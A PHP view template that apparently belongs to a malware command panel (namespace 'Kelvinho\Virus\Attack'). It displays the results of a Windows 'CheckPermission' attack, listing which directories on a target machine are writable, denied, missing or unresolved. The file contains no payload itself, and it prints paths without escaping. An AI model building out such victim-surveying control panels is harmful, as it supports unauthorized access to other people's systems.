<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission\CheckPermission;
use function Kelvinho\Virus\map;

/** @var CheckPermission $attack */

?>
<p>Allowed directories:</p>
<ul>
    <?php
    $directories = $attack->getDirectories(CheckPermission::PERMISSION_ALLOWED);
    if (count($directories) == 0) { ?>
        (No directories)
    <?php } else {
        map($directories, function ($directory) { ?>
            <li>
                <pre><?php echo $directory["path"]; ?></pre>
            </li>
        <?php });
    } ?>
</ul>
<p>Not allowed directories:</p>
<ul>
    <?php
    $directories = $attack->getDirectories(CheckPermission::PERMISSION_NOT_ALLOWED);
    if (count($directories) == 0) { ?>
        (No directories)
    <?php } else {
        map($directories, function ($directory) { ?>
            <li>
                <pre><?php echo $directory["path"]; ?></pre>
            </li>
        <?php });
    } ?>
</ul>
<p>Directories that does not exist:</p>
<ul>
    <?php
    $directories = $attack->getDirectories(CheckPermission::PERMISSION_DOES_NOT_EXIST);
    if (count($directories) == 0) { ?>
        (No directories)
    <?php } else {
        map($directories, function ($directory) { ?>
            <li>
                <pre><?php echo $directory["path"]; ?></pre>
            </li>
        <?php });
    } ?>
</ul>
<p>Something has gone wrong with these directories:</p>
<ul>
    <?php
    $directories = $attack->getDirectories(CheckPermission::PERMISSION_UNSET);
    if (count($directories) == 0) { ?>
        (No directories)
    <?php } else {
        map($directories, function ($directory) { ?>
            <li>
                <pre><?php echo $directory["path"]; ?></pre>
            </li>
        <?php });
    } ?>
</ul>